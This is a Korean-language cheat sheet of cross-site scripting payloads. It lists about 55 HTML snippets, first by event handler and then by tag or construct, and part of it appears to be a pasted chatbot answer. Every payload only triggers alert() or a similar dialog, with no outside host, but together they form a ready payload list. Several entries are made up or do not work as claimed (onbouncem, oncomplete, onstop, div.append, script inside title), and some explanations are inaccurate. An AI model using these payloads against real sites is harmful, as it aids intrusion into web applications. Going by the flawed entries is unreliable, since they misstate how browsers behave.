## 🌼 이벤트 핸들러를 사용한 **alert** 띄우는 공격 예제. 
각 이벤트 핸들러가 **악성 스크립트**로 작동하게 만들어 **XSS 공격**을 시도하는 방식.

---

### 1. **`onerror`**: 이미지 로드 실패 시 실행

```html
<img src="nonexistent.jpg" onerror="alert('XSS - onerror')">
```

> 이미지 로드 실패 시 `onerror` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 2. **`onload`**: 리소스 로드 완료 시 실행

```html
<img src="image.jpg" onload="alert('XSS - onload')">
```

> 이미지 로드 완료 시 `onload` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 3. **`onclick`**: 클릭 시 실행

```html
<button onclick="alert('XSS - onclick')">Click me</button>
```

> 버튼 클릭 시 `onclick` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 4. **`onmouseover`**: 마우스 오버 시 실행

```html
<div onmouseover="alert('XSS - onmouseover')">Hover over me</div>
```

> 마우스를 해당 요소 위에 올리면 `onmouseover` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 5. **`onfocus`**: 포커스 진입 시 실행

```html
<input type="text" onfocus="alert('XSS - onfocus')">
```

> 입력 필드에 포커스가 들어가면 `onfocus` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 6. **`onfocusin`**: 포커스 진입 시 실행 (버블링 지원)

```html
<input type="text" onfocusin="alert('XSS - onfocusin')">
```

> `onfocusin`은 포커스가 해당 요소 또는 자식 요소로 들어갈 때 실행됩니다.

---

### 7. **`onblur`**: 포커스 아웃 시 실행

```html
<input type="text" onblur="alert('XSS - onblur')">
```

> 입력 필드에서 포커스를 벗어나면 `onblur` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 8. **`onkeydown`**: 키보드 누를 때 실행

```html
<input type="text" onkeydown="alert('XSS - onkeydown')">
```

> 키를 누를 때마다 `onkeydown` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 9. **`onkeypress`**: 키보드 입력 시 실행 (deprecated)

```html
<input type="text" onkeypress="alert('XSS - onkeypress')">
```

> 사용자가 키를 입력할 때마다 `onkeypress` 이벤트가 실행되어 `alert`이 팝업됩니다. (현재는 deprecated)

---

### 10. **`onkeyup`**: 키보드 떼는 순간 실행

```html
<input type="text" onkeyup="alert('XSS - onkeyup')">
```

> 키를 떼었을 때 `onkeyup` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 11. **`onchange`**: 입력 값이 변경될 때 실행

```html
<input type="text" onchange="alert('XSS - onchange')">
```

> 입력 값이 변경된 후, `onchange` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 12. **`ondblclick`**: 더블 클릭 시 실행

```html
<div ondblclick="alert('XSS - ondblclick')">Double-click me</div>
```

> 해당 요소를 더블 클릭하면 `ondblclick` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 13. **`onmousemove`**: 마우스 이동 시 실행

```html
<div onmousemove="alert('XSS - onmousemove')">Move your mouse here</div>
```

> 마우스를 해당 요소 위에서 이동시키면 `onmousemove` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 14. **`onmouseout`**: 마우스가 영역을 벗어날 때 실행

```html
<div onmouseout="alert('XSS - onmouseout')">Move mouse out</div>
```

> 마우스를 해당 요소에서 벗어나게 하면 `onmouseout` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 15. **`onwheel`**: 마우스 휠 움직일 때 실행

```html
<div onwheel="alert('XSS - onwheel')">Scroll with wheel</div>
```

> 마우스 휠을 굴리면 `onwheel` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 16. **`onselect`**: 텍스트 선택 시 실행

```html
<div onselect="alert('XSS - onselect')">Select some text here</div>
```

> 텍스트를 선택할 때마다 `onselect` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 17. **`onselectstart`**: 선택 시작 시 실행

```html
<div onselectstart="alert('XSS - onselectstart')">Select this text</div>
```

> 텍스트를 선택하기 시작할 때 `onselectstart` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 18. **`onabort`**: 리소스 로드 중단 시 실행

```html
<img src="image.jpg" onabort="alert('XSS - onabort')">
```

> 이미지나 리소스 로드가 중단되면 `onabort` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 19. **`onreset`**: 폼 리셋 시 실행

```html
<form onreset="alert('XSS - onreset')">
  <input type="text">
  <input type="reset">
</form>
```

> 폼을 리셋하면 `onreset` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 20. **`onsubmit`**: 폼 제출 시 실행

```html
<form onsubmit="alert('XSS - onsubmit')">
  <input type="text">
  <input type="submit">
</form>
```

> 폼을 제출할 때 `onsubmit` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 21. **`onpaste`**: 붙여넣기 시 실행

```html
<input type="text" onpaste="alert('XSS - onpaste')">
```

> 텍스트를 붙여넣을 때 `onpaste` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 22. **`ontoggle`**: `<details>` 태그의 상태 변경 시 실행

```html
<details ontoggle="alert('XSS - ontoggle')">
  <summary>Toggle me</summary>
  <p>Details content</p>
</details>
```

> `<details>` 태그의 상태가 변경될 때 `ontoggle` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 23. **`onresize`**: 요소 크기 변경 시 실행

```html
<div onresize="alert('XSS - onresize')" style="resize: both; overflow: auto; width: 100px; height: 100px;">Resize me</div>
```

> 요소 크기가 변경될 때 `onresize` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 24. **`onstop`**: 미디어 중단 시 실행

```html
<video onstop="alert('XSS - onstop')">
  <source src="movie.mp4" type="video/mp4">
</video>
```

> 미디어 재생이 중단될 때 `onstop` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 25. **`oncomplete`**: 사용자 정의 로직 완료 시 실행 (커스텀 핸들러)

```html
<div oncomplete="alert('XSS - oncomplete')">Complete me</div>
```

> 사용자 정의 로직 완료 시 `oncomplete` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 26. **`onmove`**: 요소 이동 시 실행 (구형 브라우저 전용)

```html
<div onmove="alert('XSS - onmove')">Move me</div>
```

> 요소 이동 시 `onmove` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 27. **`onrowexit`**: table row가 포커스를 잃을 때 (구형 브라우저)

```html
<tr onrowexit="alert('XSS - onrowexit')">
  <td>Table row</td>
</tr>
```

> 테이블 행이 포커스를 잃을 때 `onrowexit` 이벤트가 실행되어 `alert`


이 팝업됩니다.

---

### 28. **`ondeactivate`**: 포커스 해제 시 실행 (구형 브라우저)

```html
<div ondeactivate="alert('XSS - ondeactivate')">Deactivate me</div>
```

> 포커스를 해제할 때 `ondeactivate` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 29. **`onbeforecut`**: 잘라내기 전에 실행

```html
<input type="text" onbeforecut="alert('XSS - onbeforecut')">
```

> 잘라내기를 시작하기 전에 `onbeforecut` 이벤트가 실행되어 `alert`이 팝업됩니다.

---

### 30. **`onbouncem`**: 의심스러운 오타 또는 사용자 정의 이벤트

```html
<element onbouncem="alert('XSS - onbouncem')">Bounce me</element>
```

> 해당 이벤트는 오타일 가능성이 있으므로 정상적인 HTML 이벤트가 아니며, **사용자 정의 이벤트**일 가능성이 높습니다.

## 🌼 일반 핸들러를 사용한 **alert** 띄우는 공격 예제. 
이벤트 핸들러를 제외한 나머지

---
물론이죠! 각 핸들러에 대한 XSS 페이로드를 사용한 예시를 만들어 드릴게요. 여기서는 **보안 취약점 진단** 목적으로만 사용하는 것이며, 실제 공격을 시도하는 것은 법적, 윤리적으로 문제가 될 수 있습니다. 아래는 **각 핸들러**를 사용하는 **XSS 페이로드**입니다.

---

## **XSS 페이로드 예시**

### 1. **`layer`**

```html
<layer onload="alert('XSS - layer')"></layer>
```

> \*\*`layer`\*\*는 과거 Netscape에서 사용되던 태그이므로, 현대 웹에서는 사용할 수 없습니다. 하지만 테스트 환경에서는 이와 유사한 방식으로 XSS를 실험할 수 있습니다.

---

### 2. **`applet`**

```html
<applet code="javascript:alert('XSS - applet');"></applet>
```

> **`<applet>`** 태그는 더 이상 사용되지 않지만, 오래된 브라우저에서 여전히 동작할 수 있습니다.

---

### 3. **`document`**

```html
<script>
  document.body.innerHTML = '<img src="x" onerror="alert(\'XSS - document\')">';
</script>
```

> **`document`** 객체를 사용하여 DOM을 조작할 때 발생할 수 있는 XSS 예시입니다.

---

### 4. **`xml`**

```html
<xml>
  <test><![CDATA[<img src="x" onerror="alert('XSS - xml')">]]></test>
</xml>
```

> XML 문서 내에서 악의적인 코드가 삽입되면, 이를 처리하는 환경에 따라 XSS가 발생할 수 있습니다.

---

### 5. **`link`**

```html
<link rel="stylesheet" href="javascript:alert('XSS - link');">
```

> **`<link>`** 태그의 `href` 속성에 자바스크립트를 삽입하여 XSS를 유발할 수 있습니다.

---

### 6. **`msgbox`**

```html
<msgbox onclick="alert('XSS - msgbox')">Click me</msgbox>
```

> \*\*`msgbox`\*\*는 일부 구형 브라우저에서만 사용되므로, 테스트 환경에서만 확인할 수 있습니다.

---

### 7. **`object`**

```html
<object data="javascript:alert('XSS - object')"></object>
```

> **`<object>`** 태그에 JavaScript를 삽입하여 XSS 공격을 실행할 수 있습니다.

---

### 8. **`embed`**

```html
<embed type="text/javascript" src="javascript:alert('XSS - embed')">
```

> **`<embed>`** 태그를 사용하여 외부 스크립트를 실행시키는 예시입니다.

---

### 9. **`frame`**

```html
<frame src="javascript:alert('XSS - frame')">
```

> **`<frame>`** 태그의 `src` 속성에 JavaScript를 삽입하여 공격을 시도하는 예시입니다.

---

### 10. **`base`**

```html
<base href="javascript:alert('XSS - base');">
```

> **`<base>`** 태그에 자바스크립트를 삽입하여 XSS를 유발할 수 있습니다.

---

### 11. **`bgsound`**

```html
<bgsound src="javascript:alert('XSS - bgsound');">
```

> \*\*`<bgsound>`\*\*는 Internet Explorer에서 사용되었으며, 자바스크립트를 삽입하여 XSS를 실행할 수 있습니다.

---

### 12. **`binding`**

```html
<binding ondataavailable="alert('XSS - binding')"></binding>
```

> **`<binding>`** 태그는 주로 XML 데이터를 처리할 때 사용되며, 자바스크립트를 삽입하여 XSS를 유발할 수 있습니다.

---

### 13. **`vbscript`**

```html
<vbscript>alert('XSS - vbscript')</vbscript>
```

> \*\*`<vbscript>`\*\*는 Microsoft의 VBScript를 실행하는 태그입니다. 취약한 환경에서는 XSS를 유발할 수 있습니다.

---

### 14. **`charset`**

```html
<meta charset="UTF-8" content="text/javascript; alert('XSS - charset')">
```

> **`charset`** 속성에 악의적인 스크립트를 삽입할 수 있는 예시입니다.

---

### 15. **`expression`**

```html
<style>
  div { behavior: expression(alert('XSS - expression')) }
</style>
```

> \*\*`expression`\*\*을 사용하여 스타일 시트 내에서 자바스크립트를 실행할 수 있습니다. 이는 IE에서만 동작합니다.

---

### 16. **`string`**

```html
<script>
  var string = 'alert("XSS - string")';
  eval(string);
</script>
```

> **`string`** 객체를 사용하여 XSS를 발생시킬 수 있는 예시입니다.

---

### 17. **`append`**

```html
<script>
  var div = document.createElement('div');
  div.append('<img src="x" onerror="alert(\'XSS - append\')">');
  document.body.appendChild(div);
</script>
```

> **`append`** 메서드를 통해 DOM 요소를 동적으로 추가할 때 XSS가 발생할 수 있습니다.

---

### 18. **`meta`**

```html
<meta http-equiv="refresh" content="0; url=javascript:alert('XSS - meta')">
```

> **`<meta>`** 태그의 `http-equiv` 속성에 자바스크립트를 삽입하여 XSS를 유발할 수 있습니다.

---

### 19. **`prompt`**

```html
<button onclick="prompt('XSS - prompt')">Click me</button>
```

> \*\*`prompt`\*\*를 사용하여 사용자로부터 입력을 받을 때 XSS가 발생할 수 있습니다.

---

### 20. **`confirm`**

```html
<button onclick="confirm('XSS - confirm')">Click me</button>
```

> **`confirm`** 다이얼로그 박스에서 XSS를 발생시킬 수 있습니다.

---

### 21. **`title`**

```html
<title><script>alert('XSS - title')</script></title>
```

> **`<title>`** 태그에 자바스크립트를 삽입하여 XSS를 유발할 수 있습니다.

---

### 22. **`void`**

```html
<a href="javascript:void(alert('XSS - void'))">Click me</a>
```

> **`void`** 연산자를 사용하여 XSS를 발생시킬 수 있습니다.

---

### 23. **`refresh`**

```html
<meta http-equiv="refresh" content="0; url=javascript:alert('XSS - refresh')">
```

> **`<meta>`** 태그를 사용하여 페이지를 새로 고침하거나 리다이렉트할 때 XSS를 유발할 수 있습니다.

---

### 24. **`blink`**

```html
<blink><script>alert('XSS - blink')</script></blink>
```

> **`<blink>`** 태그는 더 이상 지원되지 않지만, 테스트 환경에서는 이와 같은 방식으로 XSS를 확인할 수 있습니다.

---

### 25. **`style`**

```html
<style>
  div { background-image: url("javascript:alert('XSS - style')"); }
</style>
```

> **`<style>`** 태그 내에서 자바스크립트를 실행시킬 수 있는 방법입니다.
